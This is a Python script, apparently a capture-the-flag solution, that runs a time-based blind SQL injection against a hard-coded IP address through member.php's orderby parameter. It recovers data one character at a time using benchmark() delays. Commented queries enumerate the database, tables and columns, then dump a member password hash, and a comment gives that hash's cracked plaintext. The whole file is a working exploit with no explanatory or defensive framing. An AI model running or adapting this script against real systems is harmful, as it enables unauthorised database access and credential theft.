#!/usr/bin/env python3
#-*- coding:utf-8 -*-
#__author__: 颖奇L'Amore www.gem-love.com

import requests
import time as t
from urllib.parse import quote

url = 'http://134.175.185.244/member.php?orderby='
alphabet = [',','.','_','a','b','c','d','e','f','j','h','i','g','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','G','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','0','1','2','3','4','5','6','7','8','9']
#your sql query here:
sql = 'select database()' #TesT
#sql = "select group_concat(table_name) from information_schema.tables where table_schema=database()" #member,users
#sql = 'select group_concat(column_name) from information_schema.columns where table_schema=database()' #id, username, password
#sql = 'select password from member' #18a960a3a0b3554b314ebe77fe545c85 md5解密goodlucktoyou
result = ''
l = 1
for i in range(1,30):
    if i > l:
        break
    for char in alphabet:
        # payload = quote(payload)
        payload = "and case when (substr(({}),{},1)='{}') then (benchmark(100000,sha1(sha(sha(1))))) else 0 end;".format(sql, i, char)
        # payload = quote(payload)

        #time
        start = int(t.time())
        r = requests.get(url+payload)
        end = int(t.time()) - start

        if end >= 3:
            result += char
            print(result)
            l += 1
            break
        # else:
        #     print(url+payload)
